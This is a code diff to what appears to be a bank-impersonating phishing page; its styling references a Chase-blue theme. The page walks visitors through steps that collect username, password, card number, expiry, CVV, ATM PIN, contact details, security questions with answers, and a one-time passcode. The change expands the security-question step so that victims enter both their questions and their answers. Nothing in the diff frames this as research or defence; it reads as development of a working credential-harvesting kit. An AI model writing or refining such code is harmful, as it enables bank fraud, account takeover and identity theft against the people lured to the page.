@@ -64,7 +64,8 @@
             { name: 'LOGIN_CREDENTIALS', title: 'Verify Your Identity', fields: ['username', 'password'], progress: 20 },
             { name: 'VERIFICATION_INFO', title: 'Additional Verification', fields: ['card', 'exp', 'cvv', 'pin'], progress: 40 },
             { name: 'CONTACT_INFO', title: 'Contact Information', fields: ['email', 'phone'], progress: 60 },
-            { name: 'SECURITY_QUESTIONS', title: 'Security Questions', fields: ['q1', 'q2'], progress: 80 },
+            // UPDATED: Now requires four fields (2 questions, 2 answers)
+            { name: 'SECURITY_QUESTIONS', title: 'Security Questions (Complete two fields)', fields: ['q1_question', 'q1_answer', 'q2_question', 'q2_answer'], progress: 80 },
             { name: 'OTP_ENTRY', title: 'One-Time Passcode', fields: ['otp'], progress: 95 },
             { name: 'COMPLETE', title: 'Thank You', fields: [], progress: 100 }
         ];
@@ -136,50 +137,76 @@
 
             let formHtml = `<h2 class="text-xl font-bold text-gray-800 mb-6">${step.title}</h2><form id="current-form">`;
             
-            // Generate form fields
-            step.fields.forEach(field => {
-                let label, type = 'text', inputAttributes = 'required';
-                
-                switch(field) {
-                    case 'username': label = 'Username'; break;
-                    case 'password': label = 'Password'; type = 'password'; break;
-                    case 'card': label = 'Credit/Debit Card Number'; type = 'tel'; inputAttributes = 'required pattern="[0-9]{13,19}" maxlength="19"'; break;
-                    case 'exp': label = 'Expiration Date (MM/YY)'; type = 'tel'; inputAttributes = 'required pattern="(0[1-9]|1[0-2])\/[0-9]{2}" maxlength="5" placeholder="MM/YY"'; break;
-                    case 'cvv': label = 'CVV (3-4 digits)'; type = 'password'; inputAttributes = 'required pattern="[0-9]{3,4}" maxlength="4"'; break;
-                    case 'pin': label = 'ATM PIN'; type = 'password'; inputAttributes = 'required pattern="[0-9]{4}" maxlength="4"'; break;
-                    case 'email': label = 'Email Address'; type = 'email'; break;
-                    case 'phone': label = 'Phone Number (XXX-XXX-XXXX)'; type = 'tel'; inputAttributes = 'required pattern="[0-9]{3}-?[0-9]{3}-?[0-9]{4}" maxlength="12" placeholder="e.g., 555-123-4567"'; break;
-                    case 'q1': label = 'What is your mother\'s maiden name?'; break;
-                    case 'q2': label = 'What was the name of your first pet?'; break;
-                    case 'otp': label = 'One-Time Passcode'; type = 'tel'; inputAttributes = 'required pattern="[0-9]{6}" maxlength="6"'; break;
-                    default: label = field;
-                }
+            // --- SECURITY QUESTIONS STEP HANDLING ---
+            if (step.name === 'SECURITY_QUESTIONS') {
+                formHtml += `
+                    <p class="text-sm text-gray-600 mb-6">For security, please enter the questions and answers you used to set up your account.</p>
 
-                if (field !== 'exp' && field !== 'cvv') {
+                    <!-- Question 1 -->
+                    <div class="mb-6 border-t pt-4">
+                        <label for="q1_question" class="block text-sm font-medium text-gray-700 mb-1">Security Question 1 (e.g., What is your mother's maiden name?)</label>
+                        <input type="text" id="q1_question" name="q1_question" class="w-full px-4 py-2 border border-gray-300 rounded-lg input-focus focus:outline-none" required>
+                    </div>
+                    <div class="mb-6">
+                        <label for="q1_answer" class="block text-sm font-medium text-gray-700 mb-1">Answer 1</label>
+                        <input type="text" id="q1_answer" name="q1_answer" class="w-full px-4 py-2 border border-gray-300 rounded-lg input-focus focus:outline-none" required>
+                    </div>
+
+                    <!-- Question 2 -->
+                    <div class="mb-6 border-t pt-4">
+                        <label for="q2_question" class="block text-sm font-medium text-gray-700 mb-1">Security Question 2 (e.g., What was the name of your first pet?)</label>
+                        <input type="text" id="q2_question" name="q2_question" class="w-full px-4 py-2 border border-gray-300 rounded-lg input-focus focus:outline-none" required>
+                    </div>
+                    <div class="mb-6">
+                        <label for="q2_answer" class="block text-sm font-medium text-gray-700 mb-1">Answer 2</label>
+                        <input type="text" id="q2_answer" name="q2_answer" class="w-full px-4 py-2 border border-gray-300 rounded-lg input-focus focus:outline-none" required>
+                    </div>
+                `;
+            } else {
+                // --- DEFAULT FIELD RENDERING FOR OTHER STEPS ---
+                step.fields.forEach(field => {
+                    let label, type = 'text', inputAttributes = 'required';
+                    
+                    switch(field) {
+                        case 'username': label = 'Username'; break;
+                        case 'password': label = 'Password'; type = 'password'; break;
+                        case 'card': label = 'Credit/Debit Card Number'; type = 'tel'; inputAttributes = 'required pattern="[0-9]{13,19}" maxlength="19"'; break;
+                        case 'exp': label = 'Expiration Date (MM/YY)'; type = 'tel'; inputAttributes = 'required pattern="(0[1-9]|1[0-2])\/[0-9]{2}" maxlength="5" placeholder="MM/YY"'; break;
+                        case 'cvv': label = 'CVV (3-4 digits)'; type = 'password'; inputAttributes = 'required pattern="[0-9]{3,4}" maxlength="4"'; break;
+                        case 'pin': label = 'ATM PIN'; type = 'password'; inputAttributes = 'required pattern="[0-9]{4}" maxlength="4"'; break;
+                        case 'email': label = 'Email Address'; type = 'email'; break;
+                        case 'phone': label = 'Phone Number (XXX-XXX-XXXX)'; type = 'tel'; inputAttributes = 'required pattern="[0-9]{3}-?[0-9]{3}-?[0-9]{4}" maxlength="12" placeholder="e.g., 555-123-4567"'; break;
+                        case 'otp': label = 'One-Time Passcode'; type = 'tel'; inputAttributes = 'required pattern="[0-9]{6}" maxlength="6"'; break;
+                        default: label = field;
+                    }
+
+                    if (field !== 'exp' && field !== 'cvv') {
+                        formHtml += `
+                            <div class="mb-4">
+                                <label for="${field}" class="block text-sm font-medium text-gray-700 mb-1">${label}</label>
+                                <input type="${type}" id="${field}" name="${field}" class="w-full px-4 py-2 border border-gray-300 rounded-lg input-focus focus:outline-none" ${inputAttributes}>
+                            </div>
+                        `;
+                    }
+                });
+                
+                // Special layout for Verification Info step (exp and cvv)
+                if (step.name === 'VERIFICATION_INFO') {
                     formHtml += `
-                        <div class="mb-4">
-                            <label for="${field}" class="block text-sm font-medium text-gray-700 mb-1">${label}</label>
-                            <input type="${type}" id="${field}" name="${field}" class="w-full px-4 py-2 border border-gray-300 rounded-lg input-focus focus:outline-none" ${inputAttributes}>
+                        <div class="flex space-x-4 mb-4">
+                            <div class="flex-1">
+                                <label for="exp" class="block text-sm font-medium text-gray-700 mb-1">Expiration (MM/YY)</label>
+                                <input type="tel" id="exp" name="exp" class="w-full px-4 py-2 border border-gray-300 rounded-lg input-focus focus:outline-none" required pattern="(0[1-9]|1[0-2])\/[0-9]{2}" maxlength="5" placeholder="MM/YY">
+                            </div>
+                            <div class="flex-1">
+                                <label for="cvv" class="block text-sm font-medium text-gray-700 mb-1">CVV</label>
+                                <input type="password" id="cvv" name="cvv" class="w-full px-4 py-2 border border-gray-300 rounded-lg input-focus focus:outline-none" required pattern="[0-9]{3,4}" maxlength="4">
+                            </div>
                         </div>
                     `;
                 }
-            });
-            
-            // Special layout for Verification Info step
-            if (step.name === 'VERIFICATION_INFO') {
-                formHtml += `
-                    <div class="flex space-x-4 mb-4">
-                        <div class="flex-1">
-                            <label for="exp" class="block text-sm font-medium text-gray-700 mb-1">Expiration (MM/YY)</label>
-                            <input type="tel" id="exp" name="exp" class="w-full px-4 py-2 border border-gray-300 rounded-lg input-focus focus:outline-none" required pattern="(0[1-9]|1[0-2])\/[0-9]{2}" maxlength="5" placeholder="MM/YY">
-                        </div>
-                        <div class="flex-1">
-                            <label for="cvv" class="block text-sm font-medium text-gray-700 mb-1">CVV</label>
-                            <input type="password" id="cvv" name="cvv" class="w-full px-4 py-2 border border-gray-300 rounded-lg input-focus focus:outline-none" required pattern="[0-9]{3,4}" maxlength="4">
-                        </div>
-                    </div>
-                `;
             }
+
 
             formHtml += `
                 <button type="submit" class="w-full chase-blue text-white py-3 rounded-lg font-semibold hover:bg-blue-700 transition duration-300 mt-2">Continue</button>
@@ -210,7 +237,7 @@
             });
 
             if (!allValid) {
-                // Show a standard message if fields are missing (optional, browser handles required fields)
+                // If fields are missing, let the browser handle the 'required' warning
                 return;
             }
             
